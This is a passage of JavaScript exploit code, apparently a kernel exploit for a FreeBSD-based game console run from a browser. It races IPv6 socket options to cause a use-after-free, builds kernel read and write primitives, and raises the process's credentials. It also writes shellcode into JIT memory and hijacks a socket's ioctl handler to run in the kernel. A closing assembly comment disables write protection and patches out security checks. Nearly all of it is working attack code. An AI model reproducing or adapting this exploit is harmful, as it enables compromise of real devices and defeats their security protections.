  const rthdr_buffer = tmp_tclass.add32(size_of_tmp_tclass);
  const ptr_size_of_rthdr_buffer = rthdr_buffer.add32(size_of_rthdr_buffer);
  const spray_sockets_ptr = ptr_size_of_rthdr_buffer.add32(size_of_ptr_size_of_rthdr_buffer);
  const leak_sockets_ptr = spray_sockets_ptr.add32(size_of_spray_socks);
  const slave_sockets_ptr = leak_sockets_ptr.add32(size_of_leak_socks);
  const spray_socks_tclasses_ptr = slave_sockets_ptr.add32(size_of_slave_socks);
  const pktinfo_buffer = spray_socks_tclasses_ptr.add32(size_of_spray_socks_tclasses);
  const pktinfo_buffer_len = pktinfo_buffer.add32(size_of_pktinfo_buffer);
  const find_slave_buffer = pktinfo_buffer_len.add32(size_of_pktinfo_buffer_len);
  const fake_socketops = find_slave_buffer.add32(size_of_find_slave_buffer);
  const loop_counter = fake_socketops.add32(size_of_fake_socketops);
  const fix_these_sockets_ptr = loop_counter.add32(size_of_loop_counter);

  var overlapped_socket = -1;
  var overlapped_socket_idx = -1;

  var slave_socket = -1;

  var leaked_pktopts_address = 0;

  var target_file;
  var socketops;
  var kernel_base;

  p.write8(valid_pktopts.add32(0x0), 0x14);
  p.write4(valid_pktopts.add32(0x8), IPPROTO_IPV6);
  p.write4(valid_pktopts.add32(0xC), IPV6_TCLASS);
  p.write4(valid_pktopts.add32(0x10), 0x0);

  p.write8(size_of_tclass, 0x4);
  p.write8(spray_tclass, SPRAY_TCLASS);

  p.write8(master_main_tclass, 0x0);
  p.write8(master_thr1_tclass, 0x0);
  p.write8(master_thr2_tclass, 0x0);

  p.write8(taint_tclass, TAINT_CLASS);
  p.write8(tmp_tclass, 0x10);

  p.write8(pktinfo_buffer_len, 0x14);

  //create sockets
  const master_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const target_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const spare_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;

  const this_pid = chain.syscall(20).low;

  {

    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(spray_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(leak_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(slave_sockets_ptr.add32(0x4 * i));
    }
  }
  chain.run();

  const spray_sockets = p.array_from_address(spray_sockets_ptr, NUM_SPRAY_SOCKS);
  const spray_socks_tclasses = p.array_from_address(spray_socks_tclasses_ptr, NUM_SPRAY_SOCKS);

  const leak_sockets = p.array_from_address(leak_sockets_ptr, NUM_LEAK_SOCKS);
  const slave_sockets = p.array_from_address(slave_sockets_ptr, NUM_SLAVE_SOCKS);

  const fix_me = p.array_from_address(fix_these_sockets_ptr, NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2);

  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
    fix_me[i] = spray_sockets[i];
  }
  for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
    fix_me[i + NUM_SPRAY_SOCKS] = leak_sockets[i];
  }
  for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
    fix_me[i + (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS)] = slave_sockets[i];
  }

  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x0] = master_socket;
  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x1] = spare_socket;

  for (var i = 0; i < 10; i++) {
    p.write8(fake_socketops.add32(i * 0x8), window.gadgets["ret"]);
  }
  p.write8(fake_socketops.add32(0x50), 1);

  var thr1_start;
  var thr1_ctrl;
  const thread1 = chain.spawn_thread("thread1", function (new_thr) {
    const loop_start = new_thr.get_rsp();
    const trigger_condition = new_thr.create_equal_branch(triggered, 1);

    const triggered_false = new_thr.get_rsp();
    new_thr.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr1_tclass, size_of_tclass);
    const overlap_condition = new_thr.create_equal_branch(master_thr1_tclass, SPRAY_TCLASS);

    const overlap_false = new_thr.get_rsp();
    new_thr.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    new_thr.push(window.gadgets["pop rdi"]);
    var dest_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["pop rsi"]);
    var src_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["mov [rdi], rsi"]);
    var l1 = new_thr.get_rsp();
    new_thr.push(window.gadgets["pop rsp"]);
    var l2 = new_thr.get_rsp();
    new_thr.push(0x43434343);

    new_thr.finalizeSymbolic(dest_idx, l2);
    new_thr.finalizeSymbolic(src_idx, l1);
    thr1_start = loop_start;
    thr1_ctrl = l2;

    const overlap_true = new_thr.get_rsp();
    new_thr.push_write8(triggered, 1);

    const triggered_true = new_thr.get_rsp();
    new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);

    new_thr.set_branch_points(trigger_condition, triggered_true, triggered_false);
    new_thr.set_branch_points(overlap_condition, overlap_true, overlap_false);
  });

  //boys dont race too fast now, kthx.
  var me = chain.call(libKernelBase.add32(OFFSET_lk_pthread_self));
  var prio = p.malloc(0x8);
  p.write4(prio, 0x100);
  var r = chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);

  const thread3 = new rop(); {
    //main loop
    const loop_start = thread3.get_rsp();
    //set valid.
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    //make thr1 give it a go
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr2_tclass, size_of_tclass);
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_tclass, 4);
    }
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_main_tclass, size_of_tclass);
    const overlap_condition = thread3.create_equal_branch(master_main_tclass, SPRAY_TCLASS);
    const overlap_false = thread3.get_rsp();
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }
    thread3.jmp_rsp(loop_start);
    const overlap_true = thread3.get_rsp();
    thread3.push_write8(triggered, 1);
    thread3.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_TCLASS, taint_tclass, 4);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.fcall(syscalls[118], spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_socks_tclasses_ptr.add32(0x4 * i), size_of_tclass);
    }
    //make sure the thread will exit(?)
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.set_branch_points(overlap_condition, overlap_true, overlap_false);
  }
  //trigger uaf
  thread1();
  thread3.run();

  function find_socket_overlap() {
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      if (spray_socks_tclasses[i] == TAINT_CLASS) {
        overlapped_socket = spray_sockets[i];
        overlapped_socket_idx = i;
        return;
      }
    }
    alert("[ERROR] -> failed to find socket overlap. (should be unreachable)");
    while (1) {};
  }

  function fake_pktopts(pktinfo) {
    {

      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, 0x100);
      chain.push_write8(rthdr_buffer.add32(0x0), 0x0F001E00);
      chain.push_write8(rthdr_buffer.add32(PKTOPTS_PKTINFO_OFFSET), pktinfo);
      chain.push_write8(loop_counter, 0);
      chain.push_write8(tmp_tclass, 0x1);
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
      chain.fcall(window.syscalls[105], overlapped_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);

      const loop_start = chain.get_rsp();
      const loop_condition = chain.create_equal_branch(loop_counter, 0x100);

      const loop_condition_false = chain.get_rsp();
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.push_write8(rthdr_buffer.add32(PKTOPTS_TCLASS_OFFSET), (TCLASS_MASTER | i));
        chain.syscall_safe(105, leak_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, 0xF8);
      }
      chain.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, size_of_tclass);
      const overlap_condition = chain.create_greater_or_equal_branch(tmp_tclass, TCLASS_MASTER);

      const overlap_false = chain.get_rsp();
      chain.push(window.gadgets["pop rax"]);
      chain.push(loop_counter);
      chain.push(window.gadgets["inc dword [rax]"]);
      chain.jmp_rsp(loop_start);

      const loop_condition_true = chain.get_rsp();
      const overlap_true = chain.get_rsp();

      chain.set_branch_points(loop_condition, loop_condition_true, loop_condition_false);
      chain.set_branch_points(overlap_condition, overlap_true, overlap_false);
    }
    chain.run();

    const tclass = p.read4(tmp_tclass);
    if ((tclass & 0xFFFF0000) == TCLASS_MASTER) {
      overlapped_socket_idx = (tclass & 0x0000FFFF);
      overlapped_socket = leak_sockets[overlapped_socket_idx];
      return;
    }
    alert("[ERROR] failed to find RTHDR <-> master socket overlap");
    while (1) {};

  }

  function leak_rthdr_address(size) {
    const ip6r_len = ((size >> 3) - 1 & ~1);
    const ip6r_segleft = (ip6r_len >> 1);
    const header = (ip6r_len << 8) + (ip6r_segleft << 24); {
      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, size);
      chain.push_write8(rthdr_buffer, header);
      chain.push_write8(ptr_size_of_rthdr_buffer, size);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ((ip6r_len + 1) << 3));
      chain.fcall(syscalls[118], overlapped_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ptr_size_of_rthdr_buffer);
    }
    chain.run();
    const kaddress = p.read8(rthdr_buffer.add32(PKTOPTS_RTHDR_OFFSET));
    return kaddress;
  }

  function leak_pktopts() {
    leaked_pktopts_address = leak_rthdr_address(0x100); {
      chain.push_write8(tmp_tclass, 0x10);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[105], slave_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
    }
    chain.run();
  }

  function find_slave() {
    {
      chain.push_write8(pktinfo_buffer, leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[118], slave_sockets[i], IPPROTO_IPV6, IPV6_PKTINFO, find_slave_buffer.add32(0x8 * i), pktinfo_buffer_len);
      }
    }
    chain.run();

    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      if (p.read4(find_slave_buffer.add32(0x8 * i)) == (leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET)).low) {
        slave_socket = slave_sockets[i];
        return;
      }
    }
    alert("[ERROR] failed to find slave");
    while (1) {};
  }

  function kernel_read8(address) {
    {
      chain.push_write8(pktinfo_buffer, address);
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len)
    }
    chain.run();
    return p.read8(pktinfo_buffer);
  }

  function kernel_write8(address, value) {
    {
      chain.push_write8(pktinfo_buffer, address);
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len);
      chain.push_write8(pktinfo_buffer, value);
      chain.fcall(syscalls[105], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
    }
    chain.run();
  }

  function brute_force_kernel_map() {
    var attempt = new int64(((leaked_pktopts_address.low & 0xFE000000) + VM_MAP_PMAP_OFFSET), leaked_pktopts_address.hi);
    for (var i = 0; i < 0xC0; i++) {
      var kernel_pmap_store = kernel_read8(attempt);
      if (kernel_pmap_store.hi == 0xFFFFFFFF && ((kernel_pmap_store.low & 0x3FFF) == (KERNEL_PMAP_STORE_OFFSET & 0x3FFF))) {
        kernel_base = kernel_pmap_store.sub32(KERNEL_PMAP_STORE_OFFSET);
        if ((kernel_base.low & 0x3FFF) == 0x0) {
          return;
        }
      }
      attempt.sub32inplace(0x01000000);
    }
    alert("[ERROR] failed to find kernel_map");
    while (1) {};
  }

  function find_proc() {
    var proc = kernel_read8(kernel_base.add32(KERNEL_ALLPROC_OFFSET));
    while (proc.low != 0) {
      var pid = kernel_read8(proc.add32(PROC_PID_OFFSET));
      if (pid.low == this_pid) {
        return proc;
      }
      proc = kernel_read8(proc);
    }
    alert("[ERROR] failed to find proc");
    while (1) {};
  }

  function find_execution_socket() {

    var filedesc = kernel_read8(proc.add32(PROC_FILEDESC_OFFSET));
    var ofiles = kernel_read8(filedesc);
    target_file = kernel_read8(ofiles.add32(0x8 * target_socket))
    socketops = kernel_read8(target_file.add32(FILE_FOPS_OFFSET));
  }
  //lower priority
  p.write4(prio, 0x1FF);
  chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
  //find uaf
  find_socket_overlap();
  //play with uaf
  fake_pktopts(0);
  leak_sockets[overlapped_socket_idx] = spare_socket;
  //leak shit
  leak_pktopts();
  fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
  //find vvictim
  find_slave();
  brute_force_kernel_map();
  const proc = find_proc();
  const proc_ucred = kernel_read8(proc.add32(PROC_UCRED_OFFSET));
  kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));

  find_execution_socket();
  var exec_handle = chain.syscall(533, 0, 0x100000, 7);
  var write_handle = chain.syscall(534, exec_handle, 3);
  var write_address = chain.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
  var exec_address = chain.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
  chain.syscall(324, 1);
  if(exec_address.low != 0x90000000) {
      alert("[ERROR] failed to allocate jit memory");
      while(1){};
  }
  var exec_writer = p.array_from_address(write_address, 0x4000);
  for(var i = 0; i < 0x200; i++) {
      exec_writer[i] = 0x90909090;
  }
  exec_writer[0x200] = 0x37C0C748;
  exec_writer[0x201] = 0xC3000013;
  if(chain.call(exec_address).low != 0x1337) {
      alert("[ERROR] hmm weird");
      while(1){};
  }

  exec_writer[0] = 0x54415355;
  exec_writer[1] = 0x1111BB48;
  exec_writer[2] = 0x11111111;
  exec_writer[3] = 0xBD481111;
  exec_writer[4] = 0x22222222;
  exec_writer[5] = 0x22222222;
  exec_writer[6] = 0xBFE4314D;
  exec_writer[7] = 0x000000C0;
  exec_writer[8] = 0xBADE8948;
  exec_writer[9] = 0x00000002;
  exec_writer[10] = 0x8349D5FF;
  exec_writer[11] = 0x814901C4;
  exec_writer[12] = 0x000500FC;
  exec_writer[13] = 0x41E47500;
  exec_writer[14] = 0x655D5B5C;
  exec_writer[15] = 0x25048B48;
  exec_writer[16] = 0x00000000;
  exec_writer[17] = 0x08408B48;
  exec_writer[18] = 0x48408B48;
  exec_writer[19] = 0x48008B48;
  exec_writer[20] = 0x333333B9;
  exec_writer[21] = 0x33333333;
  exec_writer[22] = 0xC7C74833;
  exec_writer[23] = 0x000002BE; // num sockets
  exec_writer[24] = 0x48F63148;
  exec_writer[25] = 0x117DFE39;
  exec_writer[26] = 0x48B1148B;
  exec_writer[27] = 0x00D004C7;
  exec_writer[28] = 0x48000000;
  exec_writer[29] = 0xEB01C683;
  exec_writer[30] = 0x44BF48EA;
  exec_writer[31] = 0x44444444;
  exec_writer[32] = 0x48444444;
  exec_writer[33] = 0x555555BE;
  exec_writer[34] = 0x55555555;
  exec_writer[35] = 0x37894855;
  exec_writer[36] = 0x6666BF48;
  exec_writer[37] = 0x66666666;
  exec_writer[38] = 0x200F6666;
  exec_writer[39] = 0xFF2548C0;
  exec_writer[40] = 0x0FFFFEFF;
  exec_writer[41] = 0x87C6C022;
  exec_writer[42] = 0x0063A160;
  exec_writer[43] = 0xC087C7C3;
  exec_writer[44] = 0x480063AC;
  exec_writer[45] = 0xC7C3C031;
  exec_writer[46] = 0x639F1087;
  exec_writer[47] = 0xC0314800;
  exec_writer[48] = 0xE087C7C3;
  exec_writer[49] = 0x480063A6;
  exec_writer[50] = 0xC6C3C031;
  exec_writer[51] = 0x67B5C087;
  exec_writer[52] = 0xBE480002;
  exec_writer[53] = 0x90909090;
  exec_writer[54] = 0x8B499090;
  exec_writer[55] = 0x08B78948;
  exec_writer[56] = 0xC700264C;
  exec_writer[57] = 0x087B7087;
  exec_writer[58] = 0x0000B800;
  exec_writer[59] = 0x9087C700;
  exec_writer[60] = 0x00000004;
  exec_writer[61] = 0x66000000;
  exec_writer[62] = 0x04B987C7;
  exec_writer[63] = 0x90900000;
  exec_writer[64] = 0xBD87C766;
  exec_writer[65] = 0x90000004;
  exec_writer[66] = 0x87C76690;
  exec_writer[67] = 0x000004C6;
  exec_writer[68] = 0x87C6E990;
  exec_writer[69] = 0x001D2336;
  exec_writer[70] = 0x3987C637;
  exec_writer[71] = 0x37001D23;
  exec_writer[72] = 0xC187C766;
  exec_writer[73] = 0x9000094E;
  exec_writer[74] = 0x87C766E9;
  exec_writer[75] = 0x0009547B;
  exec_writer[76] = 0x87C7E990;
  exec_writer[77] = 0x002F2C20;
  exec_writer[78] = 0xC3C03148;
  exec_writer[79] = 0x7087C748;
  exec_writer[80] = 0x02011258;
  exec_writer[81] = 0x48000000;
  exec_writer[82] = 0xB192B78D;
  exec_writer[83] = 0x89480006;
  exec_writer[84] = 0x125878B7;
  exec_writer[85] = 0x9C87C701;
  exec_writer[86] = 0x01011258;
  exec_writer[87] = 0x48000000;
  exec_writer[88] = 0x0100000D;
  exec_writer[89] = 0xC0220F00;
  exec_writer[90] = 0x8080B848;
  exec_writer[91] = 0x80808080;
  exec_writer[92] = 0x90C38080;

  p.write8(write_address.add32(0x6), kernel_base.add32(KERNEL_M_IP6OPT_OFFSET));
  p.write8(write_address.add32(0x10), kernel_base.add32(KERNEL_MALLOC_OFFSET));
  p.write8(write_address.add32(0x51), fix_these_sockets_ptr);

  p.write8(write_address.add32(0x7B), target_file.add32(FILE_FOPS_OFFSET));
  p.write8(write_address.add32(0x85), socketops);
  p.write8(write_address.add32(0x92), kernel_base);

  p.write8(fake_socketops.add32(FILEOPS_IOCTL_OFFSET), exec_address);
  kernel_write8(target_file.add32(FILE_FOPS_OFFSET), fake_socketops);
  chain.syscall(54, target_socket, 0x20001111, 0);
  //alert("executed in kernel");
  //p.write8(0, 0);
}
/*
    - assemble & take every 4 bytes, byteswap and assign them to exec_writer
    - overwrite dynamic stuff after
*/
/*
//spam malloc, this should not be required anymore
push rbp
push rbx
push r12  

mov rbx, 0x1111111111111111
mov rbp, 0x2222222222222222
xor r12, r12

kmalloc_loop:
	mov edi, 0xC0
  mov rsi, rbx
	mov edx, 2
  call rbp
	add r12, 0x1
  cmp r12, 0x500
  jne kmalloc_loop

pop r12
pop rbx
pop rbp

//kill all of our socket file*'s just in case
//get thr pointer
mov rax, qword ptr gs:[0x0]
//get proc pointer
mov rax, qword ptr [rax + 0x8]
//get filedesc pointer
mov rax, qword ptr [rax + 0x48]
//get file pointer pointer
mov rax, qword ptr [rax + 0x0]

mov rcx, 0x3333333333333333
mov rdi, 0x2BE
xor rsi, rsi
loop_check:
  cmp rsi, rdi
  jge end
  mov edx, dword ptr [rcx + 0x4 * rsi]
  mov qword ptr [rax + rdx * 0x8], 0x0
  add rsi, 0x1
  jmp loop_check

end:

//socketops field pointer
mov rdi, 0x4444444444444444
//original socketops pointer
mov rsi, 0x5555555555555555 
mov qword ptr [rdi], rsi
//kernel base
mov rdi, 0x6666666666666666 

//disable wp
mov rax, cr0
and rax, 0xFFFFFFFFFFFEFFFF
mov cr0, rax

//sysveri just die
mov byte ptr [rdi + 0x63a160], 0xC3
mov dword ptr [rdi + 0x63acc0], 0xC3C03148
mov dword ptr [rdi + 0x639f10], 0xC3C03148
mov dword ptr [rdi + 0x63a6e0], 0xC3C03148
mov byte ptr [rdi + 0x267b5c0], 0x00

//mprotect
mov rsi, 0x8B49909090909090
mov qword ptr [rdi + 0x264C08], rsi

//setuid
mov dword ptr [rdi + 0x87B70], 0xB8

//syscall everywhere
mov dword ptr [rdi + 0x490], 0x0
mov word ptr [rdi + 0x4B9], 0x9090
mov word ptr [rdi + 0x4BD], 0x9090
mov word ptr [rdi + 0x4C6], 0xE990

//rwx mmap
mov byte ptr [rdi + 0x1D2336], 0x37
mov byte ptr [rdi + 0x1D2339], 0x37

//patch load prx
mov word ptr [rdi + 0x94EC1], 0xE990

//dlsym
mov word ptr [rdi + 0x9547B], 0xE990
mov dword ptr [rdi + 0x2F2C20], 0xC3C03148

//syscall 11
mov qword ptr [rdi + 0x1125870], 0x2
lea rsi, [rdi + 0x6B192]
mov qword ptr [rdi + 0x1125878], rsi
mov dword ptr [rdi + 0x112589C], 0x1

//enable wp
or rax, 0x10000
mov cr0, rax
mov rax, 0x8080808080808080
ret
*/


//rdi
//rsi
//rdx
//rcx
//r8
//r9